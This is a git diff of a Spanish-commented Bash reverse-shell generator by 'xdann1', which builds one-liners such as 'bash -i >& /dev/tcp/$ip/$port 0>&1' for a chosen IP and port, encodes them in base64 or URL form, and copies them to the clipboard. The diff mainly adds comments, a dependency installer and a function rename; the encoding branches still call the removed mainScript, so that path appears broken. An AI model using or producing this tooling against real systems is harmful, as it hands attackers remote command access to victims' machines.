@@ -1,6 +1,8 @@
 #!/bin/bash
 
-#Colours
+# Autor: xdann1
+
+#Colores
 greenColour="\e[0;32m\033[1m"
 endColour="\033[0m\e[0m"
 redColour="\e[0;31m\033[1m"
@@ -11,7 +13,8 @@ turquoiseColour="\e[0;36m\033[1m"
 grayColour="\e[0;37m\033[1m"
 
 
-# Functions
+# Funciones
+# Funcion que muestra el banner
 function banner(){
 	echo -e "${grayColour}
 ┏━━━┓             ┏━━━━━┓
@@ -22,6 +25,7 @@ function banner(){
 ┗━━━┻━━━━━┻━┻━━┻━━┻━┛┗━━┻━━┛┗━┛${endColour}		${redColour}[*]${endColour} ${purpleColour}Hecho por:${endColour} ${grayColour}xdann1${endColour}"
 }
 
+# Funcion que muestra el panel de ayuda
 function helpPanel(){
 	banner
 	echo -e "\n${redColour}[!]${endColour} ${purpleColour}USO:${endColour}${yellowColour} $0 <lenguaje> <ip> <puerto>${endColour}"
@@ -57,7 +61,29 @@ function helpPanel(){
 	exit 0
 }
 
-function mainScript(){
+# Funcion que busca si tienes las herramientas necesarias instaladas, en caso de que no sea asi te las instala automaticamente
+function dependencies(){
+	tools=(xclip urlencode)
+
+	for tool in ${tools[@]}; do
+		which $tool > /dev/null 2>&1; if [ $(echo $?) == 1 ]; then
+			banner
+			echo -e "\n${redColour}[!]${endColour} ${grayColour}Falta la herramienta $tool${endColour}" 
+			echo -e "${grayColour}    Instalando la herramienta...${endColour}"
+			if [ $tool == "urlencode" ]; then sudo apt install gridsite-clients -y > /dev/null 2>&1; else sudo apt install $tool -y > /dev/null 2>&1; fi 
+			which $tool > /dev/null 2>&1; if [ $(echo $?) == 0 ]; then
+				echo -e "\n${redColour}[*]${endColour} ${grayColour}Ya se ha instalado la herramienta, vuelve a ejecutar el script${grayColour}"
+			else
+				echo -e "\n${redColour}[!]${endColour} ${grayColour}La instalación ha fallado, intenta instalarlo manualmente con el comando:${grayColour}"
+				if [ $tool == "urlencode" ]; then echo -e "${yellowColour}    sudo apt install gridsite-clients"; else echo -e "    sudo apt install $tool${endColour}"; fi 
+			fi
+			exit 1
+		fi
+	done
+}
+
+# Funcion que genera la reverse shell y te la copia en la clipboard
+function shellFunction(){
 	if [ $language == "bash" ]; then
 		shell="bash -i >& /dev/tcp/$ip/$port 0>&1"
 		banner; echo -e "\n${redColour}[*] ${endColour}${grayColour}Reverse Shell ${endColour}${redColour}-> ${endColour}${yellowColour}$shell${endColour}"; echo -e "$shell" | xclip -sel clip
@@ -115,57 +141,31 @@ function mainScript(){
 	fi
 }
 
+# Funcion que codifica la reverse shell
 function encoding(){
-	if [ $code == "b64" ]; then
-		mainScript
-		encode=$(echo $shell | base64)
-		echo -e "${redColour}[*] ${endColour}${grayColour}Reverse Shell (base64) ${endColour}${redColour}-> ${endColour}${yellowColour}$encode${endColour}"; echo -e "$encode" | xclip -sel clip
-	elif [ $code == "url" ]; then
-		which urlencode > /dev/null 2>&1
-		if [ $(echo $?) == 0 ]; then
+	if [ $code ]; then
+		if [ $code == "b64" ]; then
+			mainScript
+			encode=$(echo $shell | base64)
+			echo -e "${redColour}[*] ${endColour}${grayColour}Reverse Shell (base64) ${endColour}${redColour}-> ${endColour}${yellowColour}$encode${endColour}"; echo -e "$encode" | xclip -sel clip
+
+		elif [ $code == "url" ]; then
 			mainScript
 			encode=$(urlencode -m "$shell")
 			echo -e "${redColour}[*] ${endColour}${grayColour}Reverse Shell (url) ${endColour}${redColour}-> ${endColour}${yellowColour}$encode${endColour}"; echo -e "$encode" | xclip -sel clip
-		else
-			banner
-			echo -e "\n${redColour}[!]${endColour} ${grayColour}Falta la herramienta urlencode${endColour}"
-			echo -e "    ${grayColour}Instalando la herramienta...${endColour}"
-			sudo apt install gridsite-clients -y > /dev/null 2>&1
-			which urlencode > /dev/null 2>&1
-			if [ $(echo $?) == 0 ]; then
-				echo -e "\n${redColour}[*]${endColour} ${grayColour}Ya se ha instalado la herramienta, vuelve a ejecutar el programa${grayColour}"
-			else
-				echo -e "\n${redColour}[!]${endColour} ${grayColour}La instalación ha fallado, intenta instalarlo manualmente con el comando:${grayColour}"
-				echo -e "${yellowColour}    sudo apt install gridsite-clients${endColour}"
-			fi
-		fi
-	elif [ $code == "url2" ]; then
-		which urlencode > /dev/null 2>&1
-		if [ $(echo $?) == 0 ]; then
+				
+		elif [ $code == "url2" ]; then
 			mainScript
 			encode=$(urlencode "$shell")
 			echo -e "${redColour}[*] ${endColour}${grayColour}Reverse Shell (url) ${endColour}${redColour}-> ${endColour}${yellowColour}$encode${endColour}"; echo -e "$encode" | xclip -sel clip
+		
 		else
-			banner
-			echo -e "\n${redColour}[!]${endColour} ${grayColour}Falta la herramienta urlencode${endColour}"
-			echo -e "    ${grayColour}Instalando la herramienta...${endColour}"
-			sudo apt install gridsite-clients -y > /dev/null 2>&1
-			which urlencode > /dev/null 2>&1
-			if [ $(echo $?) == 0 ]; then
-				echo -e "\n${redColour}[*]${endColour} ${grayColour}Ya se ha instalado la herramienta, vuelve a ejecutar el programa${grayColour}"
-			else
-				echo -e "\n${redColour}[!]${endColour} ${grayColour}La instalación ha fallado, intenta instalarlo manualmente con el comando:${grayColour}"
-				echo -e "${yellowColour}    sudo apt install gridsite-clients${endColour}"
-			fi
-		fi
-
-	else
-		helpPanel
+			helpPanel
+		fi	
 	fi
 }
 
-
-# Main Script
+# Script principal
 declare -i counter=0; while getopts ":l:i:p:h:c:" arg; do
 	case $arg in
 		l) language=$OPTARG; let counter+=1 ;;
@@ -177,25 +177,11 @@ declare -i counter=0; while getopts ":l:i:p:h:c:" arg; do
 done
 
 if [[ $counter -eq 3 ]]; then
-	which xclip > /dev/null 2>&1
-	if [ $(echo $?) == 0 ]; then
-		if [ $code ]; then
-			encoding
-		else
-			mainScript
-		fi
+	dependencies
+	if [ $code ]; then
+		encoding
 	else
-		banner
-		echo -e "\n${redColour}[!]${endColour} ${grayColour}Falta la herramienta xclip${endColour}"
-		echo -e "    ${grayColour}Instalando la herramienta...${endColour}"
-		sudo apt install xclip -y > /dev/null 2>&1
-		which xclip > /dev/null 2>&1
-		if [ $(echo $?) == 0 ]; then
-			echo -e "\n${redColour}[*]${endColour} ${grayColour}Ya se ha instalado la herramienta, vuelve a ejecutar el programa${grayColour}"
-		else
-			echo -e "\n${redColour}[!]${endColour} ${grayColour}La instalación ha fallado, intenta instalarlo manualmente con el comando:${grayColour}"
-			echo -e "${yellowColour}    sudo apt install xclip${endColour}"
-		fi
+		shellFunction
 	fi
 else
 	helpPanel
